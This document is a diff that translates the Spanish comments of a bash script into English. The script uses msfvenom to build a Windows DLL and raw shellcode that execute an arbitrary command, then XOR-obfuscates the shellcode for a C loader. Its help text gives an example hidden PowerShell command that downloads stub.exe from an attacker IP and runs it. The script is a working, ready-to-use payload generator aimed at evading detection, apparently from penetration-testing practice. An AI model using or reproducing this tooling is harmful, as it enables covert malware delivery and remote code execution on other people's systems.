@@ -1,11 +1,11 @@
 #!/bin/bash
 # === gen_cmd_dll.sh v1.0 ===
-# Genera DLL y shellcode ofuscado para ejecutar un comando
-# Uso: ./gen_cmd_dll.sh --cmd "powershell..." [--key 0x33] [--output payload]
+# Generates DLL and obfuscated shellcode to run a command
+# Usage: ./gen_cmd_dll.sh --cmd "powershell..." [--key 0x33] [--output payload]
 
 set -euo pipefail
 
-# === CONFIGURACIÓN POR DEFECTO ===
+# === DEFAULT CONFIGURATION ===
 CMD=""
 OUTPUT="payload"
 XOR_KEY_HEX="0x33"
@@ -14,34 +14,34 @@ SHELLCODE_BIN="payload.bin"
 DLL_OUTPUT="payload.dll"
 OBFUSCATED_SC="shellcode_xor.txt"
 
-# === FUNCIONES ===
+# === FUNCTIONS ===
 show_help() {
     cat << EOF
-Uso: $0 [opciones]
+Usage: $0 [options]
 
-Opciones:
-  --cmd CMD               Comando a empaquetar (ej: 'powershell -enc ...')
-  --key HEX               Clave XOR en hex (por defecto: $XOR_KEY_HEX)
-  --output NAME           Nombre base de salida (genera NAME.dll y NAME.bin)
-  -h, --help              Muestra esta ayuda
+Options:
+  --cmd CMD               Command to pack (e.g.: 'powershell -enc ...')
+  --key HEX               XOR key in hex (default: $XOR_KEY_HEX)
+  --output NAME           Base output name (generates NAME.dll and NAME.bin)
+  -h, --help              Show this help
 
-Ejemplo:
+Example:
   $0 --cmd 'powershell.exe -nop -w hidden -c "IWR http://10.10.14.91/stub.exe -OutFile stub.exe; Start-Process stub.exe"' --key 0x33 --output maldll
 EOF
     exit 0
 }
 
-# Función para ofuscar binario con XOR y convertir a \x..
+# Function to obfuscate binary with XOR and convert to \x..
 xor_obfuscate() {
     local input_bin="$1"
     local key_hex="$2"
-    local key_dec=$(printf "%d" "$key_hex" 2>/dev/null) || { echo "[-] Clave XOR inválida: $key_hex" >&2; exit 1; }
+    local key_dec=$(printf "%d" "$key_hex" 2>/dev/null) || { echo "[-] Invalid XOR key: $key_hex" >&2; exit 1; }
     local tmp_hex=$(mktemp)
 
-    # Convertir binario a hex plano
+    # Convert binary to flat hex
     xxd -p -c 20000 "$input_bin" | tr -d '\n' > "$tmp_hex"
 
-    # Aplicar XOR y generar formato \x..
+    # Apply XOR and generate \x.. format
     python3 -c "
 key = $key_dec
 with open('$tmp_hex', 'r') as f:
@@ -55,11 +55,11 @@ for b in bytes_list:
 print()
 " 
 
-    # Limpiar
+    # Cleanup
     rm -f "$tmp_hex"
 }
 
-# === PROCESAR ARGUMENTOS ===
+# === PROCESS ARGUMENTS ===
 while [[ $# -gt 0 ]]; do
     case $1 in
         --cmd)
@@ -68,9 +68,9 @@ while [[ $# -gt 0 ]]; do
             ;;
         --key)
             XOR_KEY_HEX="$2"
-            XOR_KEY_DEC=$(printf "%d" "$XOR_KEY_HEX" 2>/dev/null) || { echo "[-] Clave XOR inválida: $XOR_KEY_HEX"; exit 1; }
+            XOR_KEY_DEC=$(printf "%d" "$XOR_KEY_HEX" 2>/dev/null) || { echo "[-] Invalid XOR key: $XOR_KEY_HEX"; exit 1; }
             if ! [[ "$XOR_KEY_DEC" =~ ^[0-9]+$ ]]; then
-                echo "[-] Clave XOR no es un número válido."
+                echo "[-] XOR key is not a valid number."
                 exit 1
             fi
             shift 2
@@ -83,48 +83,48 @@ while [[ $# -gt 0 ]]; do
             show_help
             ;;
         *)
-            echo "Error: opción desconocida: $1"
-            echo "Use --help para ver las opciones."
+            echo "Error: unknown option: $1"
+            echo "Use --help to see options."
             exit 1
             ;;
     esac
 done
 
-# === VALIDACIÓN ===
+# === VALIDATION ===
 if [[ -z "$CMD" ]]; then
-    echo "[-] Falta el comando (--cmd). Usa --help para ver el uso."
+    echo "[-] Missing command (--cmd). Use --help to see usage."
     exit 1
 fi
 
-# Ajustar nombres de salida
+# Adjust output names
 DLL_OUTPUT="${OUTPUT}.dll"
 SHELLCODE_BIN="${OUTPUT}.bin"
 OBFUSCATED_SC="${OUTPUT}_shellcode.txt"
 
-# === 1. Generar DLL con msfvenom ===
-echo "[+] Generando DLL con comando: $CMD"
+# === 1. Generate DLL with msfvenom ===
+echo "[+] Generating DLL with command: $CMD"
 msfvenom -p windows/x64/exec CMD="$CMD" -f dll -o "$DLL_OUTPUT" >/dev/null 2>&1 || {
-    echo "[-] Error al generar DLL con msfvenom. ¿Tienes Metasploit instalado?"
+    echo "[-] Error generating DLL with msfvenom. Is Metasploit installed?"
     exit 1
 }
 
-# === 2. Generar shellcode RAW (.bin) ===
-echo "[+] Generando shellcode RAW (.bin)"
+# === 2. Generate RAW shellcode (.bin) ===
+echo "[+] Generating RAW shellcode (.bin)"
 msfvenom -p windows/x64/exec CMD="$CMD" -f raw -o "$SHELLCODE_BIN" >/dev/null 2>&1 || {
-    echo "[-] Error al generar shellcode RAW."
+    echo "[-] Error generating RAW shellcode."
     exit 1
 }
 
-# === 3. Ofuscar shellcode con XOR ===
-echo "[+] Ofuscando shellcode con XOR key: $XOR_KEY_HEX ($XOR_KEY_DEC)"
+# === 3. Obfuscate shellcode with XOR ===
+echo "[+] Obfuscating shellcode with XOR key: $XOR_KEY_HEX ($XOR_KEY_DEC)"
 xor_obfuscate "$SHELLCODE_BIN" "$XOR_KEY_HEX" > "$OBFUSCATED_SC"
 
-# === 4. Resumen final ===
+# === 4. Final summary ===
 echo ""
-echo "[+] ✅ Generación completada:"
+echo "[+] Generation completed:"
 echo "    DLL:              $DLL_OUTPUT"
 echo "    Shellcode RAW:    $SHELLCODE_BIN"
-echo "    Shellcode XOR:    $OBFUSCATED_SC (clave: $XOR_KEY_HEX)"
+echo "    Shellcode XOR:    $OBFUSCATED_SC (key: $XOR_KEY_HEX)"
 echo ""
-echo "[*] Usa el shellcode ofuscado en tu cargador (C, C++, etc)"
-echo "[*] Ejemplo de uso en C: unsigned char sc[] = $(cat $OBFUSCATED_SC);"
+echo "[*] Use the obfuscated shellcode in your loader (C, C++, etc)"
+echo "[*] Example usage in C: unsigned char sc[] = $(cat $OBFUSCATED_SC);"
